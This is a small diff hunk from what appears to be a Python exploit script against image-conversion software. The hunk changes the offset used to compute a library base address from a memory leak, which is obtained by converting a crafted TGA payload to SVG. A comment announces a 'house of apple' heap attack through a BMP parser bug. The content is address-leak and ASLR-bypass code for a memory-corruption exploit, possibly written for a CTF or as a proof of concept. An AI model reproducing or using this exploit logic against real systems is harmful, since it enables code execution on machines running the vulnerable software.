@@ -109,7 +109,7 @@ print("libc base: %s" % hex(libc_base))
 
 leak = convert(r, './payload/leak1.tga', 'svg')
 top_lib_info = '00'+extract_address_from_svg(leak)
-top_lib_addr = int.from_bytes(bytes.fromhex(top_lib_info), byteorder='little')-0x74100
+top_lib_addr = int.from_bytes(bytes.fromhex(top_lib_info), byteorder='little')-0x74100-0x4bf000
 print("top lib: %s" % hex(top_lib_addr))
 
 # perform "house of apple" by bmp parser bug
